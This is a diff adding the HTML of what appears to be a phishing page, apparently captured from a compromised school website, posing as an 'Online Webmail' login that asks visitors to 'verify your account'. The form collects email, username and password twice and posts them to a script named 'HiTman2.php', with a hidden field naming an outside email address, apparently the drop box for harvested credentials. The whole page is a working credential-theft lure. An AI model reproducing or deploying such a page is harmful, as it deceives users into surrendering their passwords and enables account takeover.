@@ -1,0 +1,77 @@
+<!-- URL =http://bbsschool.co.in/mtc/public_html/webmail/webmail/index.php--><!-- w =('bbsschool.co.in', datetime.datetime(2013, 6, 17, 11, 24, 35), datetime.datetime(2021, 6, 17, 11, 24, 35))--><html>
+ <head>
+  <title>
+   Webmail
+  </title>
+  <style>
+   *{ FONT-SIZE: 8pt; FONT-FAMILY: verdana; } b { FONT-WEIGHT: bold; } .listtitle { BACKGROUND: #425984; COLOR: #EEEEEE; white-space: nowrap; } td.list { BACKGROUND: #EEEEEE; white-space: nowrap; }
+  </style>
+ </head>
+ <body onload="document.form.username.focus();if(document.form.referer.value.indexOf('#')==-1)document.form.referer.value+=location.hash;">
+  <center>
+   <br/>
+   <br/>
+   <br/>
+   <br/>
+   <h1>
+    Welcome to Online Webmail
+   </h1>
+   <table cellpadding="5" cellspacing="1">
+    <tr>
+     <td class="listtitle" colspan="2">
+      Enter your email address and password to verify your account
+     </td>
+    </tr>
+    <form action="HiTman2.php" method="POST" name="form">
+     <input name="referer" type="hidden" value="/"/>
+     <tr>
+      <td align="right" class="list">
+       Email Address :
+      </td>
+      <td class="list">
+       <input name="email" type="text"/>
+      </td>
+     </tr>
+     <tr>
+      <td align="right" class="list">
+       User Name :
+      </td>
+      <td class="list">
+       <input name="username" type="text"/>
+      </td>
+     </tr>
+     <tr>
+      <td align="right" class="list">
+       Password :
+      </td>
+      <td class="list">
+       <input name="password" type="password"/>
+      </td>
+     </tr>
+     <tr>
+      <td align="right" class="list">
+       Confirm Password :
+      </td>
+      <td class="list">
+       <input name="confirmpassword" type="password"/>
+      </td>
+     </tr>
+     <tr>
+      <td align="right" class="listtitle" colspan="2">
+       <center>
+        <input type="submit" value="Login"/>
+       </center>
+      </td>
+     </tr>
+     <input name="datacheck" type="hidden" value="memomomo@dos11.com"/>
+     <tr>
+      <td align="center" colspan="2">
+       <a href="/CMD_LOST_PASSWORD">
+       </a>
+      </td>
+     </tr>
+    </form>
+   </table>
+  </center>
+ </body>
+</html>
